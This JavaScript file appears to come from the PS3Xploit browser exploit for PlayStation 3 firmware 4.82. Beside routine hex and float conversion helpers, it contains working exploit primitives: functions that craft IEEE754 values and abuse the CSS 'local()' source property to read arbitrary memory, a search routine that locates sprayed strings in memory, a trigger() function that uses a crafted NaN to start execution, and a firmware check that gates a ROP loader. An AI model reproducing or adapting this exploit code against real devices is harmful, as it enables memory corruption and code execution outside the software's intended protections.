function asciiAt(str, i){
	return str.charCodeAt(i)&0xFF;
}
function str2ascii(str){
	var ascii = "";
	for (var i = 0; i < str.length; i++) {
		ascii += str.charCodeAt(i).toString(16);
	}
	return ascii;
}
function hexToBytes(hex){
	var bytes = [];
    for (var c = 0; c < hex.length; c += 2)
    bytes.push(parseInt(hex.substr(c, 2), 16));
    return bytes;
}
function Repeat(s, n){
	var a = [];
	while(a.length < n)
	{
		a.push(s);
	}
	return a.join('');
}
function hexh2bin(hex_val)
{
	var str = "";
	var half = hex_val & 0xFFFF;
	str = half.toString(16);
	if (str.length < 3)
	{
		str = "%" + Repeat("0", 2 - str.length) + str;
	}
	else
	{
		str = "%u" + Repeat("0", 4 - str.length) + str;
	}
	
	return unescape(str);
}
function hexw2bin(hex_val)
{
	return "" + hexh2bin(hex_val >> 16)+ "" + hexh2bin(hex_val);
}
function s2hex(str){
	var str_ret = '';
	for (var i = 0; i < str.length; i++)
	{
		if(str.charCodeAt(i)==0){
			str_ret+=hex8((str.charCodeAt(i) >>> 4).toString(16));
			str_ret+=hex8((str.charCodeAt(i) & 0xF).toString(16));
		}
		else
		{
			str_ret+=(str.charCodeAt(i) >>> 4).toString(16);
			str_ret+=(str.charCodeAt(i) & 0xF).toString(16);
		}
	}
	return str_ret;
}
function bytesToHex(str){
	var hex = [];
    for (var  i = 0; i < str.length; i++) {
		if(str.charCodeAt(i)==0){
			hex.push(hex8((str.charCodeAt(i) >>> 4).toString(16)));
			hex.push(hex8((str.charCodeAt(i) & 0xF).toString(16)));
		}
		else
		{
			hex.push((str.charCodeAt(i) >>> 4).toString(16));
			hex.push((str.charCodeAt(i) & 0xF).toString(16));
		}
    }
	return hex.join("");
}
function hex32(s){
	return ('00000000' + s).substr(-8);
}
function hex16(s){
	return ('0000' + s).slice(-4)
}
function hex8(s){
	return ('00' + s).substr(-2);
}
function sleep(milliseconds){
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds){
      break;
    }
  }
}

function logAdd(txt,_log){
	if(!_log) return;
	var div = document.createElement("div");
	div.innerHTML = txt;
	_log.appendChild(div);
}
function logEntry(){
		var _logger = document.getElementById("log");
		while (_logger.firstChild) {_logger.removeChild(_logger.firstChild);}
		if (!_logger) return 0;
		var logger = document.createElement("div");
		if (_logger.hasChildNodes()){
			_logger.insertBefore(logger, _logger.firstChild);
		}else{
			_logger.appendChild(logger);
		}
		return logger;
}

function writeEnvInfo(__log_div){
	__log_div.innerHTML="<hr><h3>PS3 System Browser Info:</h3><br>"+navigator.userAgent+"<br>"+navigator.appName+" (" + navigator.platform + ")<br>"+new Date().toTimeString() + "<br>";
}
function setCharAt(str,index,chr){
	if(index > str.length-1) return str;
	return str.substr(0,index) + chr + str.substr(index+1);
}
String.prototype.replaceAt=function(index, ch){
	return this.substr(0, index) + ch + this.substr(index+ch.length);
}

//#########################################################################################################################################################################

Number.prototype.noExponents=function()
{
    var data= String(this).split(/[eE]/);
    if(data.length== 1) return data[0]; 
    var  z= '', sign= this<0? '-':'',
    str= data[0].replace('.', ''),
    mag= Number(data[1])+ 1;
    if(mag<0){
        z= sign + '0.';
        while(mag++) z += '0';
        return z + str.replace(/^\-/,'');
    }
    mag -= str.length;  
    while(mag--) z += '0';
    return str + z;
}
function fromIEEE754(bytes, ebits, fbits)
{
	var retNumber = 0;
	var bits = [];
	for (var i = bytes.length; i; i -= 1)
	{
		var byte = bytes[i - 1];
		for (var j = 8; j; j -= 1)
		{
			bits.push(byte % 2 ? 1 : 0); byte = byte >> 1;
		}
	}
	bits.reverse();
	var str = bits.join('');
	var bias = (1 << (ebits - 1)) - 1;
	var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
	var e = parseInt(str.substring(1, 1 + ebits), 2);
	var f = parseInt(str.substring(1 + ebits), 2);
	if (e === (1 << ebits) - 1)
	{
		retNumber = f !== 0 ? NaN : s * Infinity;
	}
	else if (e > 0)
	{
		retNumber = s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits));
	}
	else if (f !== 0)
	{
		retNumber = s * Math.pow(2, -(bias-1)) * (f / Math.pow(2, fbits));
	}
	else
	{
		retNumber = s * 0;
	}
	return retNumber.noExponents();
}
function generateIEEE754(address, size)
{
	var hex = new Array
	(
		(address >> 24) & 0xFF,
		(address >> 16) & 0xFF,
		(address >> 8) & 0xFF,
		(address) & 0xFF,
		
		(size >> 24) & 0xFF,
		(size >> 16) & 0xFF,
		(size >> 8) & 0xFF,
		(size) & 0xFF
	);
	return fromIEEE754(hex, 11, 52);
}
function generateExploit(address, size)
{
	var n = (address<<32) | ((size>>1)-1);
	return generateIEEE754(address, (n-address));
}

function readMemory(exploit, address, size)
{
	var str = "local(" + generateExploit(address, size) + ")";
	exploit.style.src = str;
	return exploit.style.src;
}

function findJsVariableOffset(name,exploit_data,search_base,search_size,pattern,len,_log_div)
{
	try
	{
		var dat=readMemory(document.getElementById('exploit'),search_base,search_size).substr(6,search_size);
		for (var i=0;i<(search_size*2);i+=0x10)	{
			if (dat.charCodeAt(i/2)==pattern)
			{
				var match=0;
				for (var k=0;k<(len*2);k+=0x2)
				{
					if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))
					{
						break;
					}
					match+=1;
				}
				if (match==len)
				{
					var exploit_addr=search_base+i+2;
					//logAdd("Found "+name+" at: 0x"+exploit_addr.toString(16)+"<br>"+bytesToHex(exploit_data),_log_div);	
					
					dat=null;
					return exploit_addr;
				}
			}
		}
		dat=null;
		var end_range = search_base+search_size;
		//logAdd("The string variable named "+name+" could not be located in range 0x"+search_base.toString(16)+" - 0x"+end_range.toString(16), _log_div);
		return 0;
	} 
	catch(e) 
	{
		logAdd(e, _log_div);
	}
}
function trigger(exploit_addr){
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}

//####################################################################################################################################################################
function ps3chk(){
	var isPlaystation = false;
	var disableFeatures = false;
	var ua = navigator.userAgent;
	var uaStringCheck = ua.substring(ua.indexOf("5.0 (") + 5, ua.indexOf(") Apple") - 7);
	var fwVersion = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple"));
	
	
	switch (uaStringCheck) {
		case "PLAYSTATION":
			isPlaystation = true;
			break;

		default:
			alert("You are not on a PlayStation System! All features have been disabled");
			disableFeatures = true;
			isPlaystation = false;
			document.getElementById("load-rop").disabled=true;
			break;
	}


	if (isPlaystation) {
		switch (fwVersion) {
			case fwCompat[0]:
			   alert("Congratulations! We've detected your PlayStation 3 is running FW " + fwVersion + ", which is compatible with PS3Xploit! Enjoy!");

				break;
				
			default:
				alert("Your PS3 is not on FW 4.82! Your current running FW version is " + fwVersion + ", which is not compatible with PS3Xploit. All features have been disabled");
				disableFeatures = true;
				document.getElementById("load-rop").disabled=true;
				break;
		}
	}
}
